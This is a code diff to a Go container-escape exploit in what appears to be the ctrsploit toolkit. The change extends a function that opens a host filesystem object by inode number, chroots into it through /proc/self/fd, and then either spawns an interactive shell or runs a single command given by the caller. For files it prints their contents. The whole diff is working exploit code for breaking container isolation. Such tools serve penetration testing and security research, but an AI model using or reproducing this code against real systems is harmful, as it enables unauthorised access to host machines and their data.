@@ -9,11 +9,15 @@ import (
 	"syscall"
 
 	"github.com/ctrsploit/ctrsploit/pkg/util"
+	"github.com/ctrsploit/sploit-spec/pkg/log"
 	"github.com/ssst0n3/awesome_libs/awesome_error"
 	"golang.org/x/sys/unix"
 )
 
-func Exploit(inode int, ref string, i io.Reader, o, e io.Writer) (err error) {
+// Exploit opens the host filesystem object identified by inode/ref. When the
+// object is a directory, it enters it (chroot) and either starts an interactive
+// shell (command == "") or runs the given command once, in that order.
+func Exploit(inode int, ref, command string, i io.Reader, o, e io.Writer) (err error) {
 	fd, err := GetFd(inode, ref)
 	if err != nil {
 		return
@@ -25,11 +29,14 @@ func Exploit(inode int, ref string, i io.Reader, o, e io.Writer) (err error) {
 		return
 	}
 	if fi.IsDir() {
-		err = Chroot(fd, i, o, e)
+		err = Chroot(fd, command, i, o, e)
 		if err != nil {
 			return
 		}
 	} else {
+		if command != "" {
+			log.Logger.Warnf("--cmd is ignored: inode %d is a file, not a directory", inode)
+		}
 		fmt.Printf("stat: %+v\n", fi)
 		content, e := io.ReadAll(f)
 		if e != nil {
@@ -60,6 +67,10 @@ func GetFd(inode int, ref string) (fd int, err error) {
 	return
 }
 
-func Chroot(rootFd int, i io.Reader, o, e io.Writer) (err error) {
-	return util.InvokeShellUnderDir(fmt.Sprintf("/proc/self/fd/%d", rootFd), i, o, e)
+func Chroot(rootFd int, command string, i io.Reader, o, e io.Writer) (err error) {
+	dir := fmt.Sprintf("/proc/self/fd/%d", rootFd)
+	if command == "" {
+		return util.InvokeShellUnderDir(dir, i, o, e)
+	}
+	return util.InvokeCommandUnderDir(dir, command, i, o, e)
 }
